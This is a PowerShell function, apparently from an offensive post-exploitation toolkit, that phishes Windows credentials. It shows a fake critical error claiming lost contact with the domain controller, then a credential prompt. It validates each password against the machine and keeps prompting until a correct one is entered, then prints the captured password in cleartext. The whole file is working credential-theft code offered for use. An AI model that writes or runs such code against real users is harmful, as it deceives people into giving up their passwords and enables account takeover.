function Invoke-Prompt
{
    [CmdletBinding()]
    Param (
        [Switch] $ProcCreateWait,
        [String] $MsgText = 'Lost contact with the Domain Controller.',
        [String] $IconType = 'Critical',
        [String] $Title = 'ERROR - 0xA801B720'
    )

    Add-Type -AssemblyName Microsoft.VisualBasic
    Add-Type -assemblyname System.DirectoryServices.AccountManagement

    $DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine)
    if($MsgText -and $($MsgText -ne ''))
    {
        $null = [Microsoft.VisualBasic.Interaction]::MsgBox($MsgText, "OKOnly,MsgBoxSetForeground,SystemModal,$IconType", $Title)
    }

    $c=[System.Security.Principal.WindowsIdentity]::GetCurrent().name
    $credential = $host.ui.PromptForCredential("Credentials Required", "Please enter your user name and password.", $c, "NetBiosUserName")

    if($credential)
    {
        while($DS.ValidateCredentials($c, $credential.GetNetworkCredential().password) -ne $True)
        {
            $credential = $Host.ui.PromptForCredential("Windows Security", "Invalid Credentials, Please try again", "$env:userdomain\$env:username","")
        }
        "[+] Prompted credentials: -> " + $c + ":" + $credential.GetNetworkCredential().password
    }
    else{
        "[!] User closed credential prompt"
    }
}

